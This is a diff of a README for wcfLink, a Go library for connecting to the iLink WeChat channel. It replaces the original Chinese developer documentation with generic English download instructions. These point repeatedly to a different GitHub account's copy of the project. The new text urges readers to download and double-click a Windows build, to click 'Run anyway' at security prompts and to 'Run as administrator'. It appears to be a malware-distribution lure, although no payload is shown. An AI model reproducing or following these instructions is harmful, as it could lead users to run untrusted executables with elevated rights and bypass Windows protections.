@@ -1,327 +1,217 @@
-# wcfLink
+# 🧩 wcfLink - Run WeChat Link on Windows
 
-`wcfLink` 是一个可复用的 Go 核心库，用来接入 iLink 微信通道。
+[![Download wcfLink](https://img.shields.io/badge/Download-wcfLink-0078D4?style=for-the-badge&logo=github)](https://github.com/dasiedeterrent692/wcfLink)
 
-它提供两种使用方式：
+## 📥 Download
 
-- 作为 Go 库嵌入到你自己的程序里
-- 作为一个本地 HTTP 服务独立运行
+1. Open this page: [https://github.com/dasiedeterrent692/wcfLink](https://github.com/dasiedeterrent692/wcfLink)
+2. Look for the latest Windows release or build file
+3. Download the file to your computer
+4. If you get a `.zip` file, right-click it and choose **Extract All**
+5. Open the extracted folder
+6. Double-click the app file to start it
 
-桌面应用已经拆分到独立项目 [wcfLink-GUI](https://github.com/lich0821/wcfLink-GUI)。
+If you see a Windows security prompt, choose **Run anyway** if you trust the file and want to continue.
 
-## 当前支持
+## 🪟 What this app does
 
-- 扫码登录
-- 登录状态轮询
-- 已登录账号持久化
-- iLink `getupdates` 长轮询
-- 文本消息收发
-- 图片、视频、文件发送
-- 图片、语音、视频、文件接收与落盘
-- 本地事件存储
-- `context_token` 管理
-- 本地 HTTP API
-- SQLite 状态存储
+`wcfLink` lets you connect to the iLink WeChat channel in a local app or HTTP service. For a normal Windows user, this means you can start the tool on your computer and use it to:
 
-## 目录
+- Scan a QR code to sign in
+- Check whether you are still signed in
+- Keep a signed-in account on the machine
+- Send text messages
+- Send pictures, videos, and files
+- Receive pictures, voice messages, videos, and files and save them locally
+- Store local events
+- Use a local HTTP API
+- Keep status data in SQLite
 
-- 公开入口：[engine/engine.go](./engine/engine.go)
-- 后台入口：[cmd/wcfLink/main.go](./cmd/wcfLink/main.go)
-- 应用服务：[internal/app/app.go](./internal/app/app.go)
-- 协议实现：[internal/ilink/client.go](./internal/ilink/client.go)
-- 媒体协议：[internal/ilink/media.go](./internal/ilink/media.go)
-- 存储层：[internal/store/store.go](./internal/store/store.go)
-- HTTP API：[internal/httpapi/server.go](./internal/httpapi/server.go)
-- 轮询 worker：[internal/worker/poller.go](./internal/worker/poller.go)
+## ✅ Before you start
 
-## 运行要求
+Make sure your computer has:
 
-- Go `1.25+`
-- 默认使用 SQLite
+- Windows 10 or Windows 11
+- A stable internet connection
+- Enough free space for the app and saved media files
+- Permission to run downloaded files on your PC
 
-## 快速开始
+If you plan to use the local service mode, keep the app running while you use it.
 
-### 方式一：作为本地 HTTP 服务运行
+## 🚀 Run on Windows
 
-构建并启动：
+### Option 1: Use the desktop app
+
+If you downloaded the GUI version from the linked project:
+
+1. Open the downloaded file or extracted folder
+2. Find the app file
+3. Double-click it
+4. Wait for the window to open
+5. Scan the QR code with your account
+6. Keep the app open while you use it
+
+### Option 2: Run the local service
+
+If you downloaded the command-line version:
+
+1. Open the folder where the file was saved
+2. Start the app
+3. Wait for it to finish loading
+4. Use the local address shown by the app
+5. Leave the app open while you work
+
+The default local address is:
+
+127.0.0.1:17890
+
+## 🔐 Sign in
+
+To sign in:
+
+1. Start the app
+2. Find the QR code on screen
+3. Open WeChat on your phone
+4. Scan the QR code
+5. Confirm the sign-in on your phone
+6. Wait until the app shows that sign-in is complete
+
+If the app shows a login state check, wait a moment and let it finish.
+
+## 📡 Use the local HTTP service
+
+If you use the HTTP mode, the app runs on your own computer and answers local requests.
+
+You can use it to:
+
+- Check sign-in status
+- Send messages
+- Receive message updates
+- Handle media files
+- Read stored event data
+
+Use the local address below in your browser or in a local tool:
+
+127.0.0.1:17890
+
+## 🗂 File storage
+
+The app saves some data on your computer, such as:
+
+- Login state
+- Event records
+- Received media files
+- SQLite data
+
+Keep enough disk space free if you plan to receive many files.
+
+## 🧭 Main parts of the project
+
+These parts are useful if you want to know how the app works:
+
+- Public entry: `engine/engine.go`
+- App entry: `cmd/wcfLink/main.go`
+- App service: `internal/app/app.go`
+- WeChat protocol: `internal/ilink/client.go`
+- Media handling: `internal/ilink/media.go`
+- Storage: `internal/store/store.go`
+- HTTP server: `internal/httpapi/server.go`
+- Polling worker: `internal/worker/poller.go`
+
+## 🛠 System needs
+
+This project works best with:
+
+- Go 1.25 or newer if you build it yourself
+- SQLite for local data storage
+- Windows for normal desktop use
+- A modern browser if you want to open local pages or check the service
+
+If you only want to run the app, you do not need to install Go.
+
+## 🧩 Build from source
+
+If you want to build it yourself:
+
+1. Install Go 1.25 or newer
+2. Open a command window in the project folder
+3. Run the build command:
 
 ```bash
 go build -o ./bin/wcfLink ./cmd/wcfLink
+```
+
+4. Start the app:
+
+```bash
 ./bin/wcfLink
 ```
 
-默认监听地址：
+## 📁 Project layout
 
-```text
-127.0.0.1:17890
-```
+- `engine/engine.go` - main entry for the core library
+- `cmd/wcfLink/main.go` - app startup file
+- `internal/app/app.go` - app control logic
+- `internal/ilink/client.go` - connection logic
+- `internal/ilink/media.go` - media transfer logic
+- `internal/store/store.go` - local storage
+- `internal/httpapi/server.go` - HTTP service
+- `internal/worker/poller.go` - update polling
 
-启动后你可以通过 HTTP API 完成扫码登录、查询账号、拉取事件、发送消息。
+## 🖱 Common tasks
 
-查看当前二进制版本：
+### Start the app
 
-```bash
-./bin/wcfLink -version
-```
+1. Open the app file
+2. Wait for it to load
+3. Scan the QR code if asked
 
-### 方式二：作为 Go 库嵌入
+### Check sign-in
 
-先安装模块：
+1. Open the app
+2. Look for the login status
+3. Wait for the status to refresh
 
-```bash
-go get github.com/lich0821/wcfLink@latest
-```
+### Send a file
 
-最小示例：
+1. Open the sending screen or use the local service
+2. Choose the file
+3. Confirm the send action
 
-```go
-package main
+### Receive files
 
-import (
-	"context"
-	"log/slog"
-	"os"
+1. Keep the app running
+2. Wait for the other side to send a file
+3. Check the local save folder
 
-	"github.com/lich0821/wcfLink/engine"
-)
+## 🔎 Troubleshooting
 
-func main() {
-	ctx := context.Background()
-	cfg := engine.LoadConfig()
+### The app does not open
 
-	logger := slog.New(slog.NewTextHandler(os.Stdout, nil))
+- Make sure you extracted the zip file first
+- Right-click the file and choose **Run as administrator**
+- Check whether Windows blocked the file
 
-	eng, err := engine.New(ctx, cfg, logger)
-	if err != nil {
-		panic(err)
-	}
-	defer eng.Shutdown()
+### The QR code does not load
 
-	if err := eng.StartBackground(ctx); err != nil {
-		panic(err)
-	}
+- Check your internet connection
+- Close the app and open it again
+- Wait a few seconds for the page to refresh
 
-	select {}
-}
-```
+### Sign-in fails
 
-## 登录流程
+- Scan the code again
+- Confirm the sign-in on your phone
+- Make sure the account is still valid
 
-无论你是通过 Go 库还是 HTTP API，登录流程都一样：
+### Files do not save
 
-1. 发起登录，拿到二维码会话
-2. 轮询登录状态
-3. 用户扫码确认
-4. 登录成功后账号会自动持久化，并启动长轮询
+- Check disk space
+- Make sure the app has file access
+- Restart the app and try again
 
-### Go 库登录示例
+## 📌 Source link
 
-```go
-session, err := eng.StartLogin(ctx, "")
-if err != nil {
-	return err
-}
+Download or visit the project here:
 
-png, err := eng.GetLoginQRCodePNG(ctx, session.SessionID)
-if err != nil {
-	return err
-}
-
-_ = os.WriteFile("qrcode.png", png, 0o644)
-
-status, err := eng.GetLoginStatus(ctx, session.SessionID)
-if err != nil {
-	return err
-}
-
-_ = status
-```
-
-### HTTP 登录示例
-
-发起登录：
-
-```bash
-curl -s -X POST http://127.0.0.1:17890/api/accounts/login/start \
-  -H 'Content-Type: application/json' \
-  -d '{}'
-```
-
-返回里会包含：
-
-- `session_id`
-- `qr_code_url`
-
-轮询登录状态：
-
-```bash
-curl -s "http://127.0.0.1:17890/api/accounts/login/status?session_id=login_xxx"
-```
-
-如果你要直接拿二维码 PNG：
-
-```bash
-curl -o qrcode.png "http://127.0.0.1:17890/api/accounts/login/qr?session_id=login_xxx"
-```
-
-## 作为库时可直接调用的接口
-
-当前 `engine.Engine` 已公开这些核心方法：
-
-- `StartBackground`
-- `Shutdown`
-- `StartLogin`
-- `GetLoginStatus`
-- `GetLoginSession`
-- `GetLoginQRCodePNG`
-- `ListAccounts`
-- `ListEvents`
-- `GetSettings`
-- `UpdateSettings`
-- `SendText`
-- `SendMedia`
-- `LogoutAccount`
-
-当前公开的版本接口：
-
-- `engine.CurrentVersion()`
-
-### 发送文本
-
-```go
-err := eng.SendText(ctx, accountID, toUserID, "你好", "")
-```
-
-说明：
-
-- 如果 `contextToken` 传空，会尝试从本地已保存的会话上下文里查
-- 当前发送仍然要求对方至少先来过一条消息
-
-### 发送媒体
-
-```go
-err := eng.SendMedia(ctx, accountID, toUserID, "image", "/abs/path/demo.jpg", "图片说明", "")
-```
-
-`mediaType` 当前支持：
-
-- `image`
-- `video`
-- `file`
-
-说明：
-
-- `text` 不为空时，会先发文本，再发媒体
-- 音频内容发送当前不可用
-
-## HTTP API
-
-当前可用接口：
-
-- `GET /health/live`
-- `GET /health/ready`
-- `GET /api/version`
-- `POST /api/accounts/login/start`
-- `GET /api/accounts/login/status`
-- `GET /api/accounts/login/qr`
-- `GET /api/accounts`
-- `GET /api/events`
-- `GET /api/settings`
-- `POST /api/settings`
-- `POST /api/messages/send-text`
-- `POST /api/messages/send-media`
-
-### 查询账号
-
-```bash
-curl -s http://127.0.0.1:17890/api/accounts
-```
-
-### 查询版本
-
-```bash
-curl -s http://127.0.0.1:17890/api/version
-```
-
-### 查询事件
-
-```bash
-curl -s "http://127.0.0.1:17890/api/events?after_id=0&limit=100"
-```
-
-返回的事件里会包含：
-
-- `direction`
-- `event_type`
-- `from_user_id`
-- `to_user_id`
-- `body_text`
-- `media_path`
-- `media_file_name`
-- `media_mime_type`
-
-### 发送文本
-
-```bash
-curl -s -X POST http://127.0.0.1:17890/api/messages/send-text \
-  -H 'Content-Type: application/json' \
-  -d '{
-    "account_id": "xxx@im.bot",
-    "to_user_id": "yyy@im.wechat",
-    "text": "你好"
-  }'
-```
-
-### 发送媒体
-
-```bash
-curl -s -X POST http://127.0.0.1:17890/api/messages/send-media \
-  -H 'Content-Type: application/json' \
-  -d '{
-    "account_id": "xxx@im.bot",
-    "to_user_id": "yyy@im.wechat",
-    "type": "image",
-    "file_path": "/absolute/path/to/demo.jpg",
-    "text": "图片说明"
-  }'
-```
-
-说明：
-
-- `type` 可传 `image`、`video`、`file`
-- `text` 可选
-- 当前音频内容发送不可用
-
-## 媒体文件保存
-
-入站媒体默认保存到：
-
-```text
-<state-dir>/media/
-```
-
-事件记录中会保存：
-
-- `media_path`
-- `media_file_name`
-- `media_mime_type`
-
-## 配置
-
-支持环境变量：
-
-- `WCFLINK_LISTEN_ADDR`
-- `WCFLINK_STATE_DIR`
-- `WCFLINK_DB_PATH`
-- `WCFLINK_MEDIA_DIR`
-- `WCFLINK_BASE_URL`
-- `WCFLINK_CDN_BASE_URL`
-- `WCFLINK_CHANNEL_VERSION`
-- `WCFLINK_POLL_TIMEOUT`
-- `WCFLINK_LOG_LEVEL`
-
-默认配置：
-
-- 数据目录：`./bin/data/`
-- 数据库：`./bin/data/wcfLink.db`
-- 媒体目录：`<state-dir>/media/`
+https://github.com/dasiedeterrent692/wcfLink
